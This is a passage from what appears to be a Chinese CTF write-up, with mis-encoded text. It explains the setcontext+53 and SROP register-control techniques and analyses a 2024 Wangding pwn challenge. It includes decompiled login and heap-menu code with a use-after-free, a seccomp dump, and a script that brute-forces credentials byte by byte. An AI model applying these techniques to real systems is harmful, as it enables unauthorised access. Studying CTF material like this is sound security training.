data-src="/../capture_20241104185642687.bmp"></p><p>å¯ä»¥å‘ç°ï¼Œä»<code>setcontext+53</code>å¼€å§‹ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡<code>rdi</code>æ¥ç»™å¯„å­˜å™¨æ¥èµ‹å€¼ï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´ï¼Œ<mark>åªè¦æ§åˆ¶äº†rdiçš„å€¼å°±å¯ä»¥æ§åˆ¶æ‰€æœ‰å¯„å­˜å™¨çš„å€¼<mark></mark></mark></p><h2 id="sropçš„åˆ©ç”¨"><a href="#sropçš„åˆ©ç”¨" class="headerlink" title="sropçš„åˆ©ç”¨"></a><code>srop</code>çš„åˆ©ç”¨</h2><p>sropå…¶å®å°±æ˜¯é€šè¿‡<code>sigreturnç³»ç»Ÿè°ƒç”¨</code>æ¥æ¢å¤å„ä¸ªå¯„å­˜å™¨çš„å€¼,å…¶ä¸­æ˜¯ä¾æ®<code>signal Frame</code>ä¸­å‚¨å­˜çš„æ•°å€¼æ¥è¿›è¡Œå›å¤çš„ï¼Œä½†æ˜¯ç³»ç»Ÿå¹¶ä¸ä¼šå»æ£€æŸ¥æ‰¾ä¸ªæ˜¯å¦æ”¹åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¿®æ”¹è¿™é‡Œé¢çš„å†…å®¹ï¼Œä»è€Œä½¿å¾—æ§åˆ¶ä»»æ„å¯„å­˜å™¨ã€‚</p><h2 id="setcontext-53-srop"><a href="#setcontext-53-srop" class="headerlink" title="setcontext+53 + srop"></a>setcontext+53 + srop</h2><p>è¿™ä¸¤è€…çš„ç»“åˆå¯ä»¥ä½¿å¾—æˆ‘ä»¬æ§åˆ¶æ‰€æœ‰å¯„å­˜å™¨çš„æ•°å€¼ï¼Œå³ä½¿åœ¨ä¸è¿›è¡Œ<code>sigreturn</code>ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = ...</span><br><span class="line">frame.rdi = ...</span><br><span class="line">frame.rsi = ...</span><br><span class="line">frame.rdx = ...</span><br><span class="line">frame.rip = ...</span><br><span class="line"></span><br><span class="line">setcontext = setcontext + <span class="number">53</span></span><br><span class="line">setcontext(<span class="built_in">bytes</span>(frame)) -&gt; ç›¸å½“äºsrop</span><br></pre></td></tr></table></figure></div><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="2024ç½‘é¼-é’é¾™ç»„-pwn4"><a href="#2024ç½‘é¼-é’é¾™ç»„-pwn4" class="headerlink" title="2024ç½‘é¼ é’é¾™ç»„ pwn4"></a>2024ç½‘é¼ é’é¾™ç»„ pwn4</h2><p>é€šè¿‡ç™¾åº¦ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼špwn<br>é“¾æ¥ï¼š<a class="link" href="https://pan.baidu.com/s/1nSRorvpFdPa9CtCQ7JqoOw?pwd=itt3">https://pan.baidu.com/s/1nSRorvpFdPa9CtCQ7JqoOw?pwd=itt3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>æå–ç ï¼šitt3 </p><ul><li>å¼€å¯æ²™ç®±ï¼Œç¦ç”¨execve,ç›´æ¥æ‰“setcontext+53 orw</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> 0001: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> 0003: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto 0005</span><br><span class="line"> 0004: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto 0008</span><br><span class="line"> 0005: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto 0008</span><br><span class="line"> 0006: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) goto 0008</span><br><span class="line"> 0007: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> 0008: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></div><p>æŸ¥çœ‹idaï¼Œå‘ç°åœ¨æ­£å¼åˆ©ç”¨å‰ï¼Œè¿˜éœ€è¦è¾“å…¥æ­£ç¡®çš„<code>è´¦å·å¯†ç </code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fread(ptr, <span class="number">1uLL</span>, <span class="number">0x10</span>uLL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    streama = fopen(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( streama )</span><br><span class="line">    &#123;</span><br><span class="line">      fread(v11, <span class="number">1uLL</span>, <span class="number">0x20</span>uLL, streama);</span><br><span class="line">      fclose(streama);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Hello, Welcome to the Security Database. Login first!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Input your username:&quot;</span>);</span><br><span class="line">            <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">            sub_EE7(<span class="number">0</span>, (__int64)s, <span class="number">0x10</span>uLL);</span><br><span class="line">            <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_12EB(s, (__int64)ptr) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid username!&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">          <span class="keyword">if</span> ( v4 == <span class="built_in">strlen</span>(ptr) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid username length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Username correct!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">        sub_EE7(<span class="number">0</span>, (__int64)v10, <span class="number">0x20</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_12EB(v10, (__int64)v11) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid password!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">          <span class="keyword">if</span> ( v5 == <span class="built_in">strlen</span>(v11) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Password correct!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Welcome admin!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_1284();</span><br><span class="line">              <span class="built_in">puts</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">              <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_E96() )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">                  sub_134B();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">                  sub_1489();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">                  sub_15D0();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">                  sub_168D();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">                  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid password length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Can&#x27;t open password file!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Can&#x27;t open username file!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>ä½†æ˜¯åœ¨æ£€éªŒè´¦å·å¯†ç æ˜¯å¦æ­£ç¡®çš„å‡½æ•°ä¸­å­˜åœ¨æ¼æ´</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12EB</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1); <span class="comment">/* a1æ˜¯æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„ï¼Œè¿™é‡Œå–å¾—æ˜¯æˆ‘ä»¬è¾“å…¥çš„å»</span></span><br><span class="line"><span class="comment">  é€å­—èŠ‚æ¯”è¾ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€å­—èŠ‚å»çˆ†ç ´å‡ºè´¦å·å¯†ç */</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != *(_BYTE *)(i + a2) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="çˆ†ç ´è´¦å·å¯†ç "><a href="#çˆ†ç ´è´¦å·å¯†ç " class="headerlink" title="çˆ†ç ´è´¦å·å¯†ç "></a>çˆ†ç ´è´¦å·å¯†ç </h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">chars = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_name</span>():</span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            ru(<span class="string">&quot;Input your username:\n&quot;</span>)</span><br><span class="line">            sl(name+c)</span><br><span class="line">            rev = rl()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Invalid username!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;Invalid username length!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                name += c</span><br><span class="line">                success(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;Username correct!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                name += c</span><br><span class="line">                success(name)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Congratuation!!&quot;</span>)</span><br><span class="line">                pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_passwd</span>():</span><br><span class="line">    passwd=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            sla(<span class="string">&quot;Input your username:\n&quot;</span>,<span class="string">b&quot;4dm1n&quot;</span>)</span><br><span class="line">            ru(<span class="string">&quot;Input your password:\n&quot;</span>)</span><br><span class="line">            sl(passwd+c)</span><br><span class="line">            rev = rl()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Invalid password!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;password length!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                passwd += c</span><br><span class="line">                success(passwd)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;Password correct!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                passwd += c</span><br><span class="line">                success(passwd)</span><br><span class="line">                pause()</span><br><span class="line"></span><br><span class="line">brute_name()</span><br><span class="line"></span><br><span class="line">brute_passwd()</span><br></pre></td></tr></table></figure></div><h3 id="æ­£å¼çš„å †åˆ©ç”¨"><a href="#æ­£å¼çš„å †åˆ©ç”¨" class="headerlink" title="æ­£å¼çš„å †åˆ©ç”¨"></a>æ­£å¼çš„å †åˆ©ç”¨</h3><ul><li>add</li><li><mark>æœ‰é™åˆ¶è¾“å…¥çš„sizeï¼Œä½†æ˜¯è¶³å¤Ÿæ³„éœ²libcäº†ï¼Œè¾“å…¥çš„å†…å®¹è¿›è¿‡RC4åŠ å¯†ä¹‹åæ‰æ”¾å…¥å †å—<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_134B()</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  unsigned <span class="built_in">int</span> v2; // [rsp+0h] [rbp-10h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *v4; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;Input the value size: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0x300</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Size too big!&quot;</span>);</span><br><span class="line">  v4 = malloc(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(<span class="string">&quot;Input the value: &quot;</span>);</span><br><span class="line">  sub_EE7(<span class="number">0</span>, (__int64)v4, v3);</span><br><span class="line">  puts(<span class="string">&quot;Encrypt and save value...&quot;</span>);</span><br><span class="line">  v1 = strlen(aS4cur1tyP4ssw0);                 // RC4</span><br><span class="line">  sub_F98(&amp;unk_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">  sub_1152(&amp;unk_203180, v4, v3);</span><br><span class="line">  *((_DWORD *)&amp;unk_203080 + <span class="number">4</span> * v2) = v3;</span><br><span class="line">  qword_203088[<span class="number">2</span> * v2] = v4;</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>show</li><li><mark>è¾“å‡ºçš„ä¹Ÿæ˜¯ç»è¿‡RC4åŠ å¯†çš„<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1489</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v3 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Decrypt and read value...&quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">  sub_F98((__int64)&amp;unk_203180, (__int64)aS4cur1tyP4ssw0, v1);</span><br><span class="line">  sub_1152(&amp;unk_203180, qword_203088[<span class="number">2</span> * v3], *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_203080 + <span class="number">4</span> * v3));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The result is:\n\t[key,value] = [%d,%s]\n&quot;</span>, v3, (<span class="type">const</span> <span class="type">char</span> *)qword_203088[<span class="number">2</span> * v3]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Encrypt and save value...&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">  sub_F98((__int64)&amp;unk_203180, (__int64)aS4cur1tyP4ssw0, v2);</span><br><span class="line">  sub_1152(&amp;unk_203180, qword_203088[<span class="number">2</span> * v3], *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_203080 + <span class="number">4</span> * v3));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>delete</li><li><mark>å¾ˆæ˜æ˜¾çš„uafæ¼æ´<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_15D0()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v1; // rax</span><br><span class="line">  unsigned <span class="built_in">int</span> v2; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *ptr; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  ptr = (void *)qword_203088[<span class="number">2</span> * v2];</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = strlen(aS4cur1tyP4ssw0);</span><br><span class="line">    sub_F98((__int64)&amp;unk_203180, (__int64)aS4cur1tyP4ssw0, v1);</span><br><span class="line">    sub_1152(&amp;unk_203180, ptr, *((unsigned <span class="built_in">int</span> *)&amp;unk_203080 + <span class="number">4</span> * v2));</span><br><span class="line">    free(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>edit</li><li><mark>è¾“å…¥çš„ä¹Ÿè¦RC4åŠ å¯†<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_168D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v3 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  v5 = qword_203088[<span class="number">2</span> * v3];</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(&amp;unk_203080 + <span class="number">4</span> * v3);</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    sub_F98(&amp;unk_203180, 